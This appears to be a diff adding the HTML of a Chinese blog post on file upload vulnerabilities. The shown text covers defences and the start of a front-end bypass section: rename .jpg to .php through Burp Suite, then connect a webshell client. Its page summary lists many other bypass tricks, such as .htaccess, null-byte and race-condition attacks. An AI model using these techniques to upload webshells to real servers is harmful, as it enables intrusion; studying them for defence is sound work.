@@ -1,0 +1,577 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>IMJATOPOS | Jatopos的博客</title><meta name="keywords" content="Web Crypto"><meta name="author" content="Jatopos"><meta name="copyright" content="Jatopos"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="IMJATOPOS"><meta name="application-name" content="IMJATOPOS"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="IMJATOPOS"><meta property="og:url" content="http://example.com/2025/10/05/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/index.html"><meta property="og:site_name" content="Jatopos的博客"><meta property="og:description" content="前情提要引子提到文件上传，大家能想到什么呢？ 作业上传？  头像上传？  或者是视频投稿？  我们可以发现，文件上传在生活中随处可见。 但是，如果开发者没有对上传的文件做足够的校验与隔离，上传功能就可能成为入侵的入口 —— 上传 Webshell、触发远程代码执行（RCE）、引发信息泄露、造成资源耗"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://cdn.jsdelivr.net/gh/jatopos/my-image-bed/2025.10/20251005174047895.png"><meta property="article:author" content="Jatopos"><meta property="article:tag" content="Web Crypto"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/jatopos/my-image-bed/2025.10/20251005174047895.png"><meta name="description" content="前情提要引子提到文件上传，大家能想到什么呢？ 作业上传？  头像上传？  或者是视频投稿？  我们可以发现，文件上传在生活中随处可见。 但是，如果开发者没有对上传的文件做足够的校验与隔离，上传功能就可能成为入侵的入口 —— 上传 Webshell、触发远程代码执行（RCE）、引发信息泄露、造成资源耗"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="http://example.com/2025/10/05/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  linkPageTop: undefined,
+  peoplecanvas: {"enable":true,"img":"https://upload-bbs.miyoushe.com/upload/2024/07/27/125766904/ba62475f396df9de3316a08ed9e65d86_5680958632268053399..png"},
+  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
+  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
+  LA51: undefined,
+  greetingBox: undefined,
+  twikooEnvId: '',
+  commentBarrageConfig:undefined,
+  music_page_default: "nav_music",
+  root: '/',
+  preloader: {"source":3},
+  friends_vue_info: undefined,
+  navMusic: true,
+  mainTone: undefined,
+  authorStatus: {"skills":["🔍 Web","🔢 密码科学与技术本科学生","🎶 Hiphop"]},
+  algolia: undefined,
+  localSearch: undefined,
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    simplehomepage: true,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: Jatopos","link":"链接: ","source":"来源: Jatopos的博客","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
+      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isAnchor: false,
+  shortcutKey: undefined,
+  autoDarkmode: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  configTitle: 'Jatopos的博客',
+  title: 'IMJATOPOS',
+  postAI: '',
+  pageFillDescription: '前情提要, 引子, 文件上传漏洞简介, 为什么会产生文件上传漏洞？, 文件上传漏洞及绕过方式总结, 前端js验证绕过, 后端, 黑名单, 特殊解析后缀名, .htaccess（apache）, 绕过exif_imagetype()上传.htaccess, .user.ini, 大小写绕过, 空格绕过, 点绕过, $DATA绕过, 双点绕过, 双写绕过, js马及php短标签绕过, 白名单, 修改MIME信息绕过, 00截断, 字节标识与图片马绕过, GIF89a绕过, 二次渲染绕过, 条件竞争绕过, 先检查文件后缀再移动、改名, 逻辑数组绕过前情提要引子提到文件上传大家能想到什么呢作业上传头像上传或者是视频投稿我们可以发现文件上传在生活中随处可见但是如果开发者没有对上传的文件做足够的校验与隔离上传功能就可能成为入侵的入口上传触发远程代码执行引发信息泄露造成资源耗尽等后果文件上传漏洞简介文件上传即客户端通常是浏览器或脚本把本地的文件传到服务器让服务器保存并使用在里文件上传一般是指通过请求把文件作为请求体的一部分发到服务器最常见的方式是表单中的提交后浏览器会自动把文件内容打包进请求通常是格式为什么会产生文件上传漏洞开发者过度信任用户上传的文件没有对文件进行充分严格的验证和限制防御措施使用白名单只允许特定的安全的文件扩展名和类型重命名文件使用随机生成的文件名避免使用用户提供的文件名验证文件内容检查文件头的魔术数字确保文件真实类型与扩展名匹配隔离上传文件将文件上传到根目录之外的独立服务器或目录通过一个安全的脚本如的来代理访问这些文件防止直接执行设置正确的权限确保上传目录没有执行权限对图片进行二次处理如图片缩放裁剪以破坏潜在的恶意代码扫描病毒对上传的文件进行病毒扫描如果适用限制文件大小防止资源耗尽攻击接下来会详细介绍可能会存在的漏洞及利用方式文件上传漏洞及绕过方式总结前端验证绕过校验是通过前端代码完成的恶意用户可以对前端进行修改或者是通过抓包软件篡改上传的文件判断是否存在绕过漏洞可以通过比较上传允许的图片文件和不允许的文件类型产生的网络影响进行比较当存在前端验证时如果文件类型不合法会直接在前端进行拦截并提示文件往往不会传输到后端进行处理因此不会产生网络流量当上传合法文件时文件会被传送到后端这样就会有网络流量的产生绕过手段修改代码将文件上传的后缀名限制修改为删除或禁用使用代理篡改上传绕过先上传文件再通过改为蚁剑连接后端黑名单网站设立的文件上传检验主要是通过黑名单排除实现的特殊解析后缀名由于开发时设置的黑名单规则不严谨使得上传某些带有特殊后缀的文件时文件能够成功绕过检测并当作成脚本文件执行例如等注意特殊后缀名能否被解析关键看后台文件夹的文件中等等是否包含了相应的后缀名用户上传带有命令的文件可以让指定文件作为脚本语言解析前提是后端没有禁用准备文件然后写入代码上传至后端这样一来会将文件名为的文件统一当作文件解析然后接着上传带有脚本命令的图片类型文件即可绕过上传然后蚁剑连接就可以用户可以通过文件来设置特定目录和子目录下的配置这些设置会覆盖全局的相应配置首先我们编写一个文件上传我们并不能完全肯定目录下的主页文件是哪个所以我们可以直接访问目录用蚁剑连接结合具体题目或大小写绕过服务器在检查上传文件后缀名时虽然黑名单列表中有相应的非法后缀但是未考虑到字母大小写的影响没有统一处理后缀名大小写用户可以通过改变非法后缀名的某一个字母的大小写从而达到绕过目的没有设置以下安全函数转换为小写可以采用大小写绕过的方法空格绕过后端没有对文件名中的空格字符进行处理使得截取到的后缀名字符串无法匹配对上黑名单中的字符串没有设置以下安全函数首尾去空文件名后缀加空格绕过点绕过当后端没有对文件名末尾的点进行处理时即没有设置相关函数去移除名字末尾的点这时截取的后缀名中就带了点字符使得截取到的后缀名字符串无法匹配对上黑名单中的字符串会将解释为没有扩展名的文件因为末尾的点会被忽略文件的实际名称会变成但扩展名会被视为不存在没有设置以下安全函数删除文件名末尾的点在文件格式后面加点绕过后端的环境下在文件后缀名后面加上系统首先会将后面的数据当作文件流处理而不会检查后缀名上传成功后系统会自动将去除没有设置以下安全函数去除字符串上传一句话文件抓包改后缀然后使用蚁剑连接注意蚁剑连接路径不要加上在的时候如果文件名会把之后的数据当成文件流处理不会检测后缀名且保持之前的文件名他的目的就是不检查后缀名双点绕过如果有设置以下安全函数删除文件名末尾的点可以构造函数从后向前检测当检测到末尾的第一个点时会继续它的检测即从字符串的尾部开始从后向前删除点直到该字符串的末尾字符不是为止但是遇到空格会停下来函数遇到空格会停止双写绕过如果有设置函数必须替换成空格传然后用改后缀为马及短标签绕过常用木马一句话木马有时候会对一句话木马的和过滤需要用到马马如果服务器开启了短标签支持攻击者可以利用短标签绕过简化为或者在及更高版本中默认开启白名单网站设立的文件上传检验主要是通过白名单排除实现的修改信息绕过头是什么头全称头部是电子邮件或协议中用来描述数据类型格式编码方式等信息的元数据头它的主要作用是告诉接收方如何正确理解和处理消息体中的数据头本质上就是消息的头部字段常见的有指明消息体的媒体类型类型例如普通文本文本图片复合类型比如邮件正文附件指明数据在传输过程中使用的编码方式因为某些系统只能传输需要把二进制转码常见值纯文本主要用来编码带有特殊字符的文本常用于二进制附件比如图片指定数据在客户端的处理方式例如内嵌显示作为附件下载表示的版本通常是我们上传文件会发送请求在包中会带有区分文件类型的信息网站后端可以通过信息字段判断文件类型抓包工具可以任意修改请求里的字段从而实现绕过如果后端仅比对这个字段比如只允许攻击者可以将任意文件例如以上传从而绕过类型检查后端代码举例上传出错文件类型不正确请重新上传文件夹不存在请手工创建截断截断利用的是操作系统和低级语言对字符串终止符的约定在语言及许多底层实现中字符串以空字符即十六进制作为结束标志若攻击者在文本或路径中注入该字节接受字符串的底层实现会在此处将其视为终结从而截断后续内容这种截断可以被用来绕过基于字符串或路径的白名单检查例如在某些场景下应用层逻辑看到的字符串可能经过若干解析转码未包含危险后缀但在操作系统或底层处理路径时会导致真实文件名被截短从而使恶意文件写入到意想不到的位置或规避后端过滤使用条件版本配置中如果有函数和同理或含有函数且白名单中最终文件的存放位置是以拼接的方式方式上传用抓包修改参数把后面加上号的是这里我们要把它改为方式上传用抓包修改参数在路径下加上号是为了方便后面修改号的是这里我们要把它改为然后就可以放包了复制图片地址并用蚁剑进行连接注意删掉后面多余部分连接成功字节标识与图片马绕过适用条件存在文件包含模块图片字节标识如果含有以下代码说明检查字节标识或与有以下两种方法绕过法一字节标识绕过将改为后用记事本打开在一句话木马前加上占位符用打开修改头两个字节为对应的保存一下上传后用文件包含刚上传的文件比如用蚁剑连接法二图片马绕过通过生成图片马使用以下指令制作图片马上传后用文件包含刚上传的文件用蚁剑连接绕过有时会对文件内容进行检测这时我们可以用来伪装成图片二次渲染绕过概念说明服务器在接收到用户上传的图片后常会对其进行二次处理如裁剪缩放压缩或重编码并用处理后的结果替换原图若上传的图片中包含恶意脚本或嵌入载荷这些处理步骤往往会破坏或改变图像内部的数据结构从而使原有的脚本失效或被清除基本原理通过对比处理前后的图像文件分析哪些字节或数据块在渲染重编码过程中被保留不变攻击者可针对这些保留区在上传时嵌入精心构造的数据例如脚本片段以期在二次处理后仍然保留足够的信息达到绕过过滤或在后续使用时触发恶意行为的目的适用条件存在文件包含模块如果出现以下代码需要使用二次渲染绕过二次渲染后端重写文件内容没指定则返回后缀名有则不返回指定的后缀名函数查找字符串在另一个字符串中最后一次出现的位置并返回从该位置到字符串结尾的所有字符创建一块画布并从文件或地址载入一副图像创建一块画布并从文件或地址载入一副图像创建一块画布并从文件或地址载入一副图像重写后会删去原图片马中的部分所以需要找到渲染后的图片里面没有发生变化的地方添加一句话通过文件包含漏洞执行一句话一般通过格式文件执行将上传重写后的下载通过里面的比较工具对比在里面点击随便找一个公共部分插入木马即可直接上传然后进行文件包含蚁剑连接条件竞争绕过绕过方法爆破让我们来看一道例题审计代码发现文件先从临时目录被上传到服务器之后再进行白名单的判断先上传后删除中间有一个极短的窗口期文件是在服务器中的可以进行操作条件竞争漏洞在检测出不合法之前访问一次从而生成小马先上传含有小马的文件用抓包右键发送到攻击模块清除位置设置类型为无限重复设置线程为间隔为访问并抓包发送到修改类型和线程同时启动上传和读取的攻击模块查看记录会发现有一次访问成功的访问成功蚁剑连接连接成功先检查文件后缀再移动改名可以利用漏洞将文件后缀改为因为不能解析后缀所以会跳过直接解析后缀从而实现绕过注意没有这个漏洞然后利用条件竞争绕过逻辑数组绕过我们还是看一道例题禁止上传该类型文件如果保存名称为空则使用上传的文件名在上分割字符串指向数组最后一位这里用来获取后缀名禁止上传该后缀文件拼接字符串数组中的头元素和尾部元素以形成文件名文件上传成功文件上传失败请选择要上传的文件关键代码绕过以上代码的逻辑如下一共两个值读取的是拼接完是最终推荐练习靶场还有更多绕过方式等待大家去挖掘',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2025-10-05 17:57:14',
+  postMainColor: '',
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+          if (t === undefined) {
+            if (isLightMode) activateLightMode()
+            else if (isDarkMode) activateDarkMode()
+            else if (isNotSpecified || hasNoSupport) {
+              const now = new Date()
+              const hour = now.getHours()
+              const isNight = hour <= 6 || hour >= 18
+              isNight ? activateDarkMode() : activateLightMode()
+            }
+            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
+              if (saveToLocal.get('theme') === undefined) {
+                e.matches ? activateDarkMode() : activateLightMode()
+              }
+            })
+          } else if (t === 'light') activateLightMode()
+          else activateDarkMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 8.0.0"></head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://npm.elemecdn.com/anzhiyu-blog-static@1.0.4/img/avatar.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
+  endLoading: () => {
+    document.getElementById('loading-box').classList.add("loaded");
+  },
+  initLoading: () => {
+    document.getElementById('loading-box').classList.remove("loaded")
+  }
+}
+window.addEventListener('load',()=> { preloader.endLoading() })
+setTimeout(function(){preloader.endLoading();},10000)
+
+if (true) {
+  document.addEventListener('pjax:send', () => { preloader.initLoading() })
+  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><a id="site-name" href="/" accesskey="h"><div class="title">Jatopos的博客</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/10/"><span class="card-archive-list-date">十月 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/09/"><span class="card-archive-list-date">九月 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="article-meta tags"></span></div></div><h1 class="post-title" itemprop="name headline">IMJATOPOS</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2025-10-05T08:16:32.000Z" title="发表于 2025-10-05 16:16:32">2025-10-05</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2025-10-05T09:57:14.007Z" title="更新于 2025-10-05 17:57:14">2025-10-05</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="IMJATOPOS"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为长沙"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>长沙</span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src="https://cdn.jsdelivr.net/gh/jatopos/my-image-bed/2025.10/20251005174047895.png"></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="http://example.com/2025/10/05/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"><header><h1 id="CrawlerTitle" itemprop="name headline">IMJATOPOS</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">Jatopos</span><time itemprop="dateCreated datePublished" datetime="2025-10-05T08:16:32.000Z" title="发表于 2025-10-05 16:16:32">2025-10-05</time><time itemprop="dateCreated datePublished" datetime="2025-10-05T09:57:14.007Z" title="更新于 2025-10-05 17:57:14">2025-10-05</time></header><h1 id="前情提要"><a href="#前情提要" class="headerlink" title="前情提要"></a>前情提要</h1><h2 id="引子"><a href="#引子" class="headerlink" title="引子"></a>引子</h2><p>提到文件上传，大家能想到什么呢？</p>
+<p>作业上传？</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/jatopos/my-image-bed/2025.10/20251005175657808.png"></p>
+<p>头像上传？</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2025/jpeg/54428404/1759650897679-5f2c32e2-1c16-4ba8-9bc7-d73d7f8f0d17.jpeg"></p>
+<p>或者是视频投稿？</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2025/png/54428404/1759650897590-4ac56fdf-4110-4498-b467-4072ea2bd4c2.png"></p>
+<p>我们可以发现，文件上传在生活中随处可见。</p>
+<p>但是，如果开发者没有对上传的文件做足够的校验与隔离，上传功能就可能成为入侵的入口 —— 上传 Webshell、触发远程代码执行（RCE）、引发信息泄露、造成资源耗尽等后果。</p>
+<h2 id="文件上传漏洞简介"><a href="#文件上传漏洞简介" class="headerlink" title="文件上传漏洞简介"></a>文件上传漏洞简介</h2><p>文件上传，即<strong>客户端（通常是浏览器、App 或脚本）把本地的文件传到服务器</strong>，让服务器保存并使用。 </p>
+<p>在 Web 里，“文件上传”一般是指通过 HTTP&#x2F;HTTPS 请求，把文件作为请求体的一部分发到服务器。 最常见的方式是 HTML 表单中的 <code>&lt;input type=&quot;file&quot;&gt;</code>，提交后浏览器会自动把文件内容打包进请求（通常是 <strong>multipart&#x2F;form-data</strong> 格式）。 </p>
+<h2 id="为什么会产生文件上传漏洞？"><a href="#为什么会产生文件上传漏洞？" class="headerlink" title="为什么会产生文件上传漏洞？"></a><strong>为什么会产生文件上传漏洞？</strong></h2><p>开发者过度信任用户上传的文件，没有对文件进行充分、严格的验证和限制。</p>
+<p>防御措施：</p>
+<ol>
+<li><strong>使用白名单</strong>：只允许特定的、安全的文件扩展名和MIME类型。</li>
+<li><strong>重命名文件</strong>：使用随机生成的文件名，避免使用用户提供的文件名。</li>
+<li><strong>验证文件内容</strong>：检查文件头的魔术数字，确保文件真实类型与扩展名匹配。</li>
+<li><strong>隔离上传文件</strong>：将文件上传到Web根目录之外的独立服务器或目录，通过一个安全的脚本（如PHP的<code>readfile()</code>）来代理访问这些文件，防止直接执行。</li>
+<li><strong>设置正确的权限</strong>：确保上传目录没有执行权限。</li>
+<li><strong>对图片进行二次处理</strong>：如图片缩放、裁剪，以破坏潜在的恶意代码。</li>
+<li><strong>扫描病毒</strong>：对上传的文件进行病毒扫描（如果适用）。</li>
+<li><strong>限制文件大小</strong>：防止资源耗尽攻击。</li>
+</ol>
+<p><strong>接下来会详细介绍可能会存在的漏洞及利用方式</strong></p>
+<h1 id="文件上传漏洞及绕过方式总结"><a href="#文件上传漏洞及绕过方式总结" class="headerlink" title="文件上传漏洞及绕过方式总结"></a>文件上传漏洞及绕过方式总结</h1><h2 id="前端js验证绕过"><a href="#前端js验证绕过" class="headerlink" title="前端js验证绕过"></a>前端js验证绕过</h2><p>校验是通过前端javascript代码完成的。恶意用户可以对前端javascript进行修改或者是通过抓包软件篡改上传的文件</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2025/png/54428404/1759650897638-926ff6cf-58f3-48fe-85fd-7568c885ba7a.png"></p>
+<p>判断是否存在js绕过漏洞：可以通过比较上传允许的图片文件和不允许的文件类型产生的网络影响进行比较。当存在前端验证时，如果文件类型不合法会直接在前端进行拦截并提示，文件往往不会传输到后端进行处理，因此不会产生网络流量。当上传合法文件时，文件会被传送到后端，这样就会有网络流量的产生。</p>
+<p><strong>绕过手段:</strong></p>
+<p>1.修改js代码</p>
+<p> 将文件上传的后缀名限制修改为php </p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2025/png/54428404/1759650897592-3b51f697-3b7b-4f7c-ad99-b651ecf21db0.png"></p>
+<p>2.删除或禁用JS</p>
+<p><strong>3.使用代理篡改上传绕过</strong></p>
+<p><strong>先上传.jpg文件再通过burpsuite改为.<strong><strong>php</strong></strong>，蚁剑连接</strong></p>
